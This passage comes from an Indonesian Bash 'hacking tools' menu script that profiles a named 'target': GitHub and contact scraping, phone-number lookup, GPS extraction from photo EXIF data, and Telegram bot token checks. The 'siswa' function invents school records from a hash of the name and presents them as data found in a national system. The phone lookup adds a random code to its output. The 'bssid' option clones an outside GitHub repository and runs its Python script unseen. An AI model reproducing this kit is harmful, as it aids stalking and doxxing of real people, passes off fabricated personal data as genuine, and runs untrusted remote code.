██║  ███╗██║   ██║   ███████║██║   ██║██████╔╝
██║   ██║██║   ██║   ██╔══██║██║   ██║██╔══██╗
╚██████╔╝██║   ██║   ██║  ██║╚██████╔╝██████╔╝
 ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
         Development : By.Thonxyzz404
" | lolcat 
    echo -e "${p}"
    read -p "Masukkan Username Github Target : " username
    echo ""
    if ! validate_username "$username"; then
        return
    fi
    data=$(get_github_user "$username") || return
    name=$(get_field "name")
    bio=$(get_field "bio")
    avatar=$(get_field "avatar_url")
    url=$(get_field "html_url")
    location=$(get_field "location")
    followers=$(get_field "followers")
    following=$(get_field "following")
    public_repos=$(get_field "public_repos")
    created_at=$(get_field "created_at")
    updated_at=$(get_field "updated_at")
    company=$(get_field "company")
    id=$(get_field "id")
    email=$(get_email_fallback)
    facebook=$(get_facebook_from_bio)
    instagram=$(get_instagram_from_bio)
    echo -e "${g}=================================================="
    echo -e "${r}[ ${c}☢ ${r}]${y} GitHub OSINT Username : ${b}$username ${r}[${c} ☢ ${r}]"
    echo -e "${g}=================================================="
    echo ""
    echo -e "${r}[${g} ✓ ${r}]${y} Username : ${c}@$username"
    echo -e "${r}[${g} ✓ ${r}]${y} ID Pengguna : ${c}${id}"
    echo -e "${r}[${g} ✓ ${r}]${y} Nama Lengkap : ${c}${name}"
    echo -e "${r}[${g} ✓ ${r}]${y} Bio : ${c}${bio}"
    echo -e "${r}[${g} ✓ ${r}]${y} Lokasi : ${c}${location}"
    echo -e "${r}[${g} ✓ ${r}]${y} Perusahaan : ${c}${company}"
    echo -e "${r}[${g} ✓ ${r}]${y} Gmail : ${c}$email"
    echo -e "${r}[${g} ✓ ${r}]${y} Facebook : ${c}$facebook"
    echo -e "${r}[${g} ✓ ${r}]${y} Instagram : ${c}$instagram"
    echo -e "${r}[${g} ✓ ${r}]${y} Followers : ${c}${followers}"
    echo -e "${r}[${g} ✓ ${r}]${y} Mengikuti : ${c}${following}"
    echo -e "${r}[${g} ✓ ${r}]${y} Repo Publik : ${c}${public_repos}"
    echo -e "${r}[${g} ✓ ${r}]${y} Tanggal Dibuat : ${c}${created_at}"
    echo -e "${r}[${g} ✓ ${r}]${y} Terakhir Update : ${c}${updated_at}"
    echo -e "${r}[${g} ✓ ${r}]${y} Avatar : ${c}${avatar}"
    echo -e "${r}[${g} ✓ ${r}]${y} URL Profil : ${c}${url}"
    echo ""
    echo -e "${g}"
    read -p "Apakah anda ingin cari pengguna lain? (y/n) : " choice
    if [[ "$choice" =~ ^[Yy]$ ]]; then
        main
    else
        echo ""
        echo -e "${r}Keluar dari program."
        echo ""
    fi
}
main
}
function siswa() {
hash_nama() {
local nama=$(echo "$1" | tr '[:upper:]' '[:lower:]')
local md5hash=$(echo -n "$nama" | md5sum | cut -c1-12)
printf "%d\n" "0x$md5hash"
}
jenjang_list=("SMA" "SMK" "Mahasiswa")
sekolah_list=(
"SMA Negeri 1 Jakarta"
"SMA Negeri 3 Bandung"
"SMA Negeri 1 Yogyakarta"
"SMK Negeri 2 Surabaya"
"SMK Telkom Malang"
"SMK Negeri 1 Semarang"
"SMK telkomharkit ketangungan"
"SMK Syafaa'tulummah Bulakamba"
)
kampus_list=(
"Universitas Indonesia"
"Universitas Gadjah Mada"
"Institut Teknologi Bandung"
"Universitas Airlangga"
"Universitas Diponegoro"
)
jurusan_list=(
"IPA" "IPS" "Bahasa" "RPL" "TKJ" "Multimedia"
"Teknik Informatika" "Sistem Informasi"
"Ilmu Hukum" "Manajemen" "TAV" "DKV"
)
echo -e "${c}"
read -p "🔍 Masukkan Nama Lengkap : " nama_input
echo ""
nama_input=$(echo "$nama_input" | xargs)
if [ ${#nama_input} -lt 3 ]; then
echo ""
echo -e "${r}❌ Nama terlalu pendek."
clear
fi
hashed=$(hash_nama "$nama_input")
mod100=$((hashed % 100))
if [ $mod100 -lt 5 ]; then
echo ""
echo -e "${r}❌ Data tidak ditemukan di sistem nasional."
clear
fi
jenjang=${jenjang_list[$((hashed % ${#jenjang_list[@]}))]}
jurusan=${jurusan_list[$(((hashed >> 3) % ${#jurusan_list[@]}))]}
angkatan=$((2012 + ((hashed >> 4) % 10)))
if [ "$jenjang" == "Mahasiswa" ]; then
asal=${kampus_list[$(((hashed >> 5) % ${#kampus_list[@]}))]}
else
asal=${sekolah_list[$(((hashed >> 5) % ${#sekolah_list[@]}))]}
fi
echo -e "${g}📂 Data ditemukan : ${n}"
echo "• Nama     : $nama_input"
echo "• Jenjang  : $jenjang"
if [ "$jenjang" == "Mahasiswa" ]; then
echo "• Kampus   : $asal"
else
echo "• Sekolah  : $asal"
fi
echo "• Jurusan  : $jurusan"
echo "• Angkatan : $angkatan"
echo ""
echo -e "${r} Hasil Di Temukan...!!"
}
cek_kartu() {
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
generate_random_code() {
  local part1=$((RANDOM % 900 + 100))
  local part2=$((RANDOM % 900 + 100))
  echo "$part1-$part2"
}
bersihkan_nomor() {
  echo "$1" | tr -d ' ()-' | sed 's/^00/+/'
}
warnain_json() {
  local key="$1"
  local value="$2"
  if [[ "$value" == "true" || "$value" == "false" ]]; then
    val_str="$value"
  elif [[ "$value" =~ ^.*$ ]]; then
    val_str="$value"
  else
    val_str="\"$value\""
  fi
  printf "  \"%s\": %s\n" "$key" "$val_str"
}
is_valid_number() {
  [[ "$1" =~ ^\+[0-9]{10,15}$ ]] && echo "true" || echo "false"
}
format_internasional() {
  echo "$1"
}
geocoder_description() {
  case "$1" in
    +62*) echo -e "${c}Indonesia" ;;
    +60*) echo -e "${c}Malaysia" ;;
    +65*) echo -e "${c}Singapore" ;;
    +91*) echo -e "${c}India" ;;
    +1*)  echo -e "${c}USA / Canada" ;;
    +81*) echo -e "${c}Japan" ;;
    +82*) echo -e "${c}South Korea" ;;
    +86*) echo -e "${c}China" ;;
    +852*) echo -e "${c}Hong Kong" ;;
    +853*) echo -e "${c}Macau" ;;
    +886*) echo -e "${c}Taiwan" ;;
    +92*) echo -e "${c}Pakistan" ;;
    +44*) echo -e "${c}United Kingdom" ;;
    +33*) echo -e "${c}France" ;;
    +49*) echo -e "${c}Germany" ;;
    +39*) echo -e "${c}Italy" ;;
    +34*) echo -e "${c}Spain" ;;
    +7*)  echo -e "${c}Russia / Kazakhstan" ;;
    +55*) echo -e "${c}Brazil" ;;
    +52*) echo -e "${c}Mexico" ;;
    +54*) echo -e "${c}Argentina" ;;
    +61*) echo -e "${c}Australia" ;;
    +64*) echo -e "${c}New Zealand" ;;
    +966*) echo -e "${c}Saudi Arabia" ;;
    +971*) echo -e "${c}United Arab Emirates" ;;
    +90*) echo -e "${c}Turkey" ;;
    +20*) echo -e "${c}Egypt" ;;
    +27*) echo -e "${c}South Africa" ;;
    +234*) echo -e "${c}Nigeria" ;;
    +212*) echo -e "${c}Morocco" ;;
    +351*) echo -e "${c}Portugal" ;;
    +30*) echo -e "${c}Greece" ;;
    +48*) echo -e "${c}Poland" ;;
    +41*) echo -e "${c}Switzerland" ;;
    +46*) echo -e "${c}Sweden" ;;
    +47*) echo -e "${c}Norway" ;;
    +45*) echo -e "${c}Denmark" ;;
    +358*) echo -e "${c}Finland" ;;
    +420*) echo -e "${c}Czech Republic" ;;
    +36*) echo -e "${c}Hungary" ;;
    +40*) echo -e "${c}Romania" ;;
    +380*) echo -e "${c}Ukraine" ;;
    +98*) echo -e "${c}Iran" ;;
    +94*) echo -e "${c}Sri Lanka" ;;
    +66*) echo -e "${c}Thailand" ;;
    +84*) echo -e "${c}Vietnam" ;;
    +63*) echo -e "${c}Philippines" ;;
    +880*) echo -e "${c}Bangladesh" ;;
    +856*) echo -e "${c}Laos" ;;
    *) echo "Unknown" ;;
  esac
}
timezone_zones() {
  case "$1" in
    +62*) echo "[\"Asia/Jakarta\"]" ;;
    +60*) echo "[\"Asia/Kuala_Lumpur\"]" ;;
    +65*) echo "[\"Asia/Singapore\"]" ;;
    +91*) echo "[\"Asia/Kolkata\"]" ;;
    +1*)  echo "[\"America/New_York\"]" ;;
    +81*) echo "[\"Asia/Tokyo\"]" ;;
    +82*) echo "[\"Asia/Seoul\"]" ;;
    +86*) echo "[\"Asia/Shanghai\"]" ;;
    +852*) echo "[\"Asia/Hong_Kong\"]" ;;
    +853*) echo "[\"Asia/Macau\"]" ;;
    +886*) echo "[\"Asia/Taipei\"]" ;;
    +92*) echo "[\"Asia/Karachi\"]" ;;
    +44*) echo "[\"Europe/London\"]" ;;
    +33*) echo "[\"Europe/Paris\"]" ;;
    +49*) echo "[\"Europe/Berlin\"]" ;;
    +39*) echo "[\"Europe/Rome\"]" ;;
    +34*) echo "[\"Europe/Madrid\"]" ;;
    +7*)  echo "[\"Europe/Moscow\"]" ;;
    +55*) echo "[\"America/Sao_Paulo\"]" ;;
    +52*) echo "[\"America/Mexico_City\"]" ;;
    +54*) echo "[\"America/Argentina/Buenos_Aires\"]" ;;
    +61*) echo "[\"Australia/Sydney\"]" ;;
    +64*) echo "[\"Pacific/Auckland\"]" ;;
    +966*) echo "[\"Asia/Riyadh\"]" ;;
    +971*) echo "[\"Asia/Dubai\"]" ;;
    +90*) echo "[\"Europe/Istanbul\"]" ;;
    +20*) echo "[\"Africa/Cairo\"]" ;;
    +27*) echo "[\"Africa/Johannesburg\"]" ;;
    +234*) echo "[\"Africa/Lagos\"]" ;;
    +212*) echo "[\"Africa/Casablanca\"]" ;;
    +351*) echo "[\"Europe/Lisbon\"]" ;;
    +30*) echo "[\"Europe/Athens\"]" ;;
    +48*) echo "[\"Europe/Warsaw\"]" ;;
    +41*) echo "[\"Europe/Zurich\"]" ;;
    +46*) echo "[\"Europe/Stockholm\"]" ;;
    +47*) echo "[\"Europe/Oslo\"]" ;;
    +45*) echo "[\"Europe/Copenhagen\"]" ;;
    +358*) echo "[\"Europe/Helsinki\"]" ;;
    +420*) echo "[\"Europe/Prague\"]" ;;
    +36*) echo "[\"Europe/Budapest\"]" ;;
    +40*) echo "[\"Europe/Bucharest\"]" ;;
    +380*) echo "[\"Europe/Kyiv\"]" ;;
    +98*) echo "[\"Asia/Tehran\"]" ;;
    +94*) echo "[\"Asia/Colombo\"]" ;;
    +66*) echo "[\"Asia/Bangkok\"]" ;;
    +84*) echo "[\"Asia/Ho_Chi_Minh\"]" ;;
    +63*) echo "[\"Asia/Manila\"]" ;;
    +880*) echo "[\"Asia/Dhaka\"]" ;;
    +856*) echo "[\"Asia/Vientiane\"]" ;;
    *)    echo "[\"Unknown\"]" ;;
  esac
}
carrier_name() {
  case "$1" in
    +62811*|+62812*|+62813*|+62821*|+62822*|+62823*) echo "Telkomsel" ;;
    +62817*|+62818*|+62819*|+62859*) echo "XL Axiata" ;;
    +62814*|+62815*|+62816*|+62855*|+62856*|+62857*|+62858*) echo "Indosat Ooredoo" ;;
    +62877*|+62878*|+62879*) echo "Tri (3)" ;;
    +62831*|+62832*|+62833*|+62838*) echo "Axis" ;;
    +62881*|+62882*|+62883*|+62884*|+62885*|+62886*|+62887*|+62888*|+62889*) echo "Smartfren" ;;
    +6010*|+6011*|+6012*|+6013*|+6014*) echo "Maxis" ;;
    +6016*|+6017*|+6018*) echo "Digi" ;;
    +6019*|+6015*) echo "Celcom" ;;
    +6011[0-9]*) echo "U Mobile" ;;
    +6581*|+6582*|+6583*|+6584*|+6585*|+6586*) echo "Singtel" ;;
    +6589*|+6590*|+6591*) echo "StarHub" ;;
    +6587*|+6588*) echo "M1" ;;
    +9198*|+9199*|+9170*|+9171*) echo "Airtel" ;;
    +9180*|+9181*|+9182*|+9183*) echo "Jio" ;;
    +9193*|+9194*|+9195*) echo "Vodafone Idea" ;;
    +1201*|+1202*|+1203*|+1310*|+1312*|+1212*) echo "AT&T" ;;
    +1408*|+1415*|+1425*|+1503*|+1509*) echo "T-Mobile" ;;
    +1617*|+1619*|+1626*|+1702*|+1703*) echo "Verizon" ;;
    +1519*|+1416*|+1647*|+1604*) echo "Rogers (Canada)" ;;
    +1514*|+1450*|+1581*) echo "Bell (Canada)" ;;
    +8180*|+8181*|+8182*|+8183*) echo "NTT Docomo" ;;
    +8170*|+8171*|+8172*) echo "SoftBank" ;;
    +8190*|+8191*|+8192*) echo "KDDI au" ;;
    +8210*|+8211*|+8212*|+8213*) echo "SK Telecom" ;;
    +8215*|+8216*|+8217*) echo "KT Corporation" ;;
    +8218*|+8219*) echo "LG U+" ;;
    +8613*|+8614*|+8615*|+8616*) echo "China Mobile" ;;
    +8617*|+8618*) echo "China Telecom" ;;
    +8619*) echo "China Unicom" ;;
    +8525*|+8526*) echo "CSL" ;;
    +8529*) echo "SmarTone" ;;
    +8528*) echo "3 HK" ;;
    +8536*) echo "CTM" ;;
    +8538*) echo "3 Macau" ;;
    +8869[1-5]*) echo "Chunghwa Telecom" ;;
    +8869[6-8]*) echo "FarEasTone" ;;
    +88693*|+88698*) echo "Taiwan Mobile" ;;
    +9230*|+9231*|+9232*) echo "Jazz" ;;
    +9233*|+9234*) echo "Zong" ;;
    +9235*|+9236*) echo "Telenor Pakistan" ;;
    +9237*|+9238*) echo "Ufone" ;;
    +4474*|+4475*) echo "Vodafone UK" ;;
    +4477*) echo "O2 UK" ;;
    +4478*|+4479*) echo "EE UK" ;;
    +4473*) echo "Three UK" ;;
    +336*|+337*) echo "Orange France" ;;
    +3396*|+3397*) echo "SFR" ;;
    +338*|+339*) echo "Bouygues Telecom" ;;
    +4915*|+4916*|+4917*) echo "T-Mobile (Telekom)" ;;
    +4915[1-9]*) echo "Vodafone DE" ;;
    +4916[2-9]*) echo "O2 Germany" ;;
    +3933*|+3934*) echo "TIM Italy" ;;
    +3935*|+3936*) echo "Vodafone Italy" ;;
    +3937*|+3938*) echo "Wind Tre" ;;
    +3460*|+3461*|+3462*) echo "Movistar" ;;
    +3463*|+3464*|+3465*) echo "Vodafone Spain" ;;
    +3466*|+3467*|+3468*) echo "Orange Spain" ;;
    +79[0-1]*) echo "MTS Russia" ;;
    +792*|+793*) echo "Beeline Russia" ;;
    +795*|+796*) echo "MegaFon Russia" ;;
    +770*|+771*) echo "Kcell Kazakhstan" ;;
    +5511*|+5512*|+5513*) echo "Vivo" ;;
    +5514*|+5515*) echo "TIM Brazil" ;;
    +5516*|+5517*) echo "Claro Brazil" ;;
    +5518*|+5519*) echo "Oi" ;;
    +85620*) echo "Lao Telecom" ;;
    +85630*) echo "Unitel" ;;
    +85670*) echo "Beeline Laos" ;;
    +85671*) echo "ETL" ;;
    *) echo -e "${r}Tidak diketahui" ;;
  esac
}
tipe_nomor() {
  if [[ "$1" =~ ^\+[0-9]{10,15}$ ]]; then
    echo "MOBILE"
  else
    echo "UNKNOWN"
  fi
}
info_nomor_json_style() {
  local nomor_input="$1"
  local nomor
  nomor=$(bersihkan_nomor "$nomor_input")
  if [[ ! "$nomor" =~ ^\+ ]]; then
    echo -e "${r}[${g} X ${r}]${c} Kode negara harus diawali dengan, misal : +628XXX"
    return
  fi
  local valid=$(is_valid_number "$nomor")
  if [[ "$valid" != "true" ]]; then
    echo -e "${r}[${c}X${r}] Nomer Telepon Tidak Valid...!!"
    return
  fi
  local negara=$(geocoder_description "$nomor")
  local operator=$(carrier_name "$nomor")
  local zona=$(timezone_zones "$nomor")
  local tipe=$(tipe_nomor "$nomor")
  local format=$(format_internasional "$nomor")
  local kode_acak=$(generate_random_code)
  echo "{"
  warnain_json "Nomer Target" "$nomor_input"
  warnain_json "negara_asal" "$negara"
  warnain_json "operator" "$operator"
  warnain_json "Code_telepon" "$kode_acak"
  warnain_json "timezone" "$zona"
  warnain_json "tipe_nomor" "$tipe"
  warnain_json "valid" "$valid"
  echo "}"
}
clear
echo "
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⠀⠀⠀⣰⡇⢀⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⣿⣰⡀⢠⣿⣇⣾⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣰⣿⣿⢇⣾⣿⣼⣿⢃⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢋⣾⣿⣿⣿⣯⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢟⣵⣿⣿⣿⣿⣿⣿⣯⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⡿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⢀⣀⣄⣀⡀⡀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡥⠀⠀⠀⠀⠀⠀
⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠘⣿⠋⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠃⠀⠀
⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⢰⣾⣿⣿⣿⣿⣿⠟⠁⠉⠙⠻⠯⡛⠿⠛⠻⠿⠟⠛⠓⠀⠀
⠀⠜⡿⠳⡶⠻⣿⣿⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣽⣧⣾⠛⠉⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠟⠁⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
read -p "$(echo -e "${g}Masukkan Nomer ${r}[ ${g}contoh ${y}: indo +62x luar +82 ${r}]${p} : ")" nomor
echo -e "${c}"
info_nomor_json_style "$nomor"
echo ""
echo -e "${g} Informasi Di Dapatkan..!!"
echo ""
}
bssid() {
git clone --depth 32 https://github.com/SokHengkell022/Stav
cd Stav
clear 
echo "
                     ██████████████████████
               ██████████████████████████████████
           ██████████████              ██████████████
        ██████████                            ██████████
     █████████                                    █████████
   ████████                  ██████                  ████████
  ██████             ██████████████████████             ██████
   ███           ██████████████████████████████           ███
              ██████████                ██████████
           ████████                         █████████
          ██████                               ███████
           ███            ████████████            ███
                      ████████████████████
                   ███████████    ███████████
                  ███████              ███████
                   ███                    ███

                            ████████
                           ██████████
                           ██████████
                            ████████   

=============[ MAC OSINT TRACKER ( THONXYZZ404 ) ]==============
" | lolcat
python Tai.py
}
cek_botz() {
g='\033[1;32m'    
c='\033[1;36m'  
r='\033[1;31m'  
y='\033[1;33m'
clear
echo -e "${g}"
figlet Cek-Botz
echo "Development : By.Thonxyzz404" | lolcat
echo -e "${c}"
read -p "Masukkan Botz Token : " TOKEN
echo -e "${c}"
clear
figlet Hasil Info
echo "Development : By.Thonxyzz404" | lolcat
echo ""
RESPONSE=$(curl -s "https://api.telegram.org/bot$TOKEN/getMe")
USERNAME=$(echo "$RESPONSE" | jq -r '.result.username')
BOT_ID=$(echo "$RESPONSE" | jq -r '.result.id')
IS_BOT=$(echo "$RESPONSE" | jq -r '.result.is_bot')
FIRST_NAME=$(echo "$RESPONSE" | jq -r '.result.first_name')
BIO=$(echo "$RESPONSE" | jq -r '.result.bio // "Tidak ada bio"')
LANGUAGE_CODE=$(echo "$RESPONSE" | jq -r '.result.language_code // "Tidak ada bahasa"')
CPU=$(getprop ro.product.cpu.abi)
echo -e "${r}=================================="
if [ -z "$USERNAME" ] || [ "$USERNAME" = "null" ]; then
    echo -e "${y}Username Bot Telegram ${c}: ${r}Botz telah dihapus."
else
    echo -e "${y}Username Botz Telegram ${c}: ${g}@$USERNAME"
    echo -e "${y}ID Botz Telegram ${c}: ${g}$BOT_ID"
    echo -e "${y}Status Botz ${c}: ${g}$( [ "$IS_BOT" = "true" ] && echo "Ya" || echo "Tidak" )"
    echo -e "${y}Nama Botz ${c}: ${g}$FIRST_NAME"
    echo -e "${y}Bio Botz ${c}: ${g}$BIO"
    echo -e "${y}Kode Bahasa ${c}: ${g}$LANGUAGE_CODE"
fi
echo -e "${y}Distro CPU ${c}: ${g}$CPU"
echo -e "${r}=================================="
echo ""
}
cuaca_cek() {
cek_cuaca() {
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
  command_exists() {
  command -v "$1" >/dev/null 2>&1
  }
  echo -e "${c}
  ╭────────────────────────────────────────╮
  │          ${y}CEK PREDIKSI CUACA${c}            │
  ╰────────────────────────────────────────╯"
  echo -e "${g}"
  read -p "Masukkan lokasi [ contoh : jawa , jakarta ] : " lokasi
  if ! command_exists curl; then
    echo ""
    echo -e "${r}curl tidak ditemukan. Instal curl untuk menggunakan fitur ini."
    echo ""
    return 1
  fi
  echo -e "${r}Memeriksa koneksi internet..!!"
  if ! ping -c 1 8.8.8.8 > /dev/null 2>&1; then
    echo ""
    echo -e "${r}Tidak ada koneksi internet. Periksa koneksi Anda dan coba lagi."
    echo ""
    return 1
  fi
  echo -e "${g}Mengambil data cuaca untuk $lokasi..!!"
  echo ""
  cuaca=$(curl -s --connect-timeout 10 "http://wttr.in/$lokasi?format=%l:%C+%t+%w+%h" 2>/dev/null)
  if [ -z "$cuaca" ] || [[ "$cuaca" == *"Unknown"* ]] || [[ "$cuaca" == *"Sorry"* ]]; then
    echo ""
    echo -e "${r}Tidak dapat menentukan..!!"
    return 1
  fi
  echo -e "${c}
  ╭────────────────────────────────────────╮
  │           ${y}PERKIRAAN CUACA${c}              │
  ╰────────────────────────────────────────╯"
   echo ""
   echo -e "${r}[ ${g}$cuaca ${r}]"
   echo -e "${c}
  ╭────────────────────────────────────────╮
  │        ${y}INFORMASI CUACA DETAIL${c}          │
  ╰────────────────────────────────────────╯"
   echo -e "${g}"
   curl -s --connect-timeout 10 "http://wttr.in/$lokasi?1" | head -7
   echo -e "${c}
  ╭────────────────────────────────────────╮
  │             ${y}BY.THONXYZZ404${c}             │
  ╰────────────────────────────────────────╯"
}
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  cek_cuaca
fi
}
function about() {
echo -e "${p} Scraper adalah alat untuk mencari informasi nomor telepon dan melacak  lokasi IP dan akun Instagram. Dibuat oleh ${r}By.Thonxyzz404${n}"
}
function start() {
    clear
    banner
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) track_number ;;
        2|02) instagram_info ;;
        3|03) kk_info ;;
        4|04) tiktok_info ;;
        5|05) github ;;
        6|06) siswa ;;
        7|07) cek_kartu ;;
        8|08) bssid ;;
        9|09) cek_botz ;;
        0|00) about ;;
        10) cuaca_cek ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
echo ""
trap "echo -e '${r}Program interrupted by user!${n}'; exit" INT
echo ""
start
echo ""
echo -e "${cyan}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
    ;;
        21)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
p='\033[35;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
n='\033[0m'
if ! command -v exiftool &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Exiftool belum terinstall, sedang menginstall..!!"
    echo ""
    sleep 3 
    pkg update -y && pkg install exiftool -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Exiftool sudah terinstall."
    echo ""
    sleep 3 
fi
clear 
echo "
▗▄▄▄▖ ▗▄▖▗▄▄▄▖▗▄▖  ▗▄▄▖ ▗▄▄▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌▐▛▚▖▐▌
▐▛▀▀▘▐▌ ▐▌ █ ▐▌ ▐▌ ▝▀▚▖▐▌   ▐▛▀▜▌▐▌ ▝▜▌
▐▌   ▝▚▄▞▘ █ ▝▚▄▞▘▗▄▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      Developer : By.Thonxyzz404" | lolcat 
echo -e "${c}"
read -p "Masukkan path gambar : " filepath
echo ""
if [ ! -f "$filepath" ]; then
    echo -e "${r}Error file tidak ditemukan : $filepath"
    sleep 5
    echo ""
    clear 
fi
clear
echo ""
echo -e "${c}==============================================${n}"
echo "         Developer : By.Thonxyzz404" | lolcat 
echo -e "${c}==============================================${n}"
echo -e "${r}
  ⢀⣴⣿⣷⣦⡀                      
 ⢠⣿⣿⢿⣿⣿⣷⣄${c} S ${n}                   
⢀${b}⡾⠋ ⣰⣿⣿⠻⣿⣷⡀${y} C ${n}                 
⠘  ⢠⣿⣿⠃ ⠈⠻⣿⣦⡀${r} A ${n}               
  ${p} ⢸⣿⡇   ⣼⣉⣿⣷⣄ ${b} N ${n}         ⢀⣀⣀ 
${g}   ⢹⣿⡇   ⣿⣿⣿⣿⣿⣷⡄        ⢀⣴⠟⣿⠉⠁
   ⠸⣿⣿⣄  ⠘⢿⣿⡵⠋⠙⢿⣦⡀  ⣤⣠ ⣠⣿⡅ ⣿  
    ⠈${y}⠻⢿⣿⣶⣤⣄⣀   ⠈⠻⣷⣄⣠⣿⣿⡼⠋⠛⣡⡼⠋  
        ⠉⠛⠛⠻⠿⠿⠷⠶⠶⠾⣿⡿⠋⠻⣟⠉⠁     
               ⢀⡠⠶⠋           
" ⠀⠀⠀
echo -e "${c}==============================================${n}"
echo -e "${y}         📸 AUTO INFORMASI DETAIL 📸 "
echo -e "${c}==============================================${n}"
echo ""
fname=$(exiftool -s -s -s -FileName "$filepath")
fsize=$(exiftool -s -s -s -FileSize "$filepath")
make=$(exiftool -s -s -s -Make "$filepath")
model=$(exiftool -s -s -s -Model "$filepath")
iso=$(exiftool -s -s -s -ISO "$filepath")
flash=$(exiftool -s -s -s -Flash "$filepath")
focal=$(exiftool -s -s -s -'FocalLengthIn35mmFormat' "$filepath")
aperture=$(exiftool -s -s -s -ApertureValue "$filepath")
maxap=$(exiftool -s -s -s -MaxApertureValue "$filepath")
date=$(exiftool -s -s -s -CreateDate "$filepath")
wb=$(exiftool -s -s -s -WhiteBalance "$filepath")
mp=$(exiftool -s -s -s -Megapixels "$filepath")
imgsize=$(exiftool -s -s -s -ImageSize "$filepath")
gps=$(exiftool -s -s -s -GPSPosition "$filepath")
echo -e "${g}File Name ${n}: ${p}$fname${n}"
echo -e "${g}File Size ${n}: ${p}$fsize${n}"
echo -e "${g}Make ${n}: ${p}$make${n}"
echo -e "${g}Camera Model Name ${n}: ${p}$model${n}"
echo -e "${g}ISO ${n}: ${p}$iso${n}"
echo -e "${g}Flash ${n}: ${p}$flash${n}"
echo -e "${g}Focal Length In 35mm Format ${n}: ${p}$focal${n}"
echo -e "${g}Max Aperture Value ${n}: ${p}$maxap${n}"
echo -e "${g}Create Date ${n}: ${p}$date${n}"
echo -e "${g}White Balance ${n}: ${p}$wb${n}"
echo -e "${g}Aperture Value ${n}: ${p}$aperture${n}"
echo -e "${g}Image Size ${n}: ${p}$imgsize${n}"
echo -e "${g}Megapixels ${n}: ${p}$mp${n}"
echo -e "${g}GPS Position ${n}: ${p}$gps${n}"
echo ""
echo -e "${c}==============================================${n}"
echo ""
lat=$(exiftool -gpslatitude -n "$filepath" | awk -F': ' '/GPS Latitude/ {print $2}')
lon=$(exiftool -gpslongitude -n "$filepath" | awk -F': ' '/GPS Longitude/ {print $2}')
if [[ -z "$lat" || -z "$lon" ]]; then
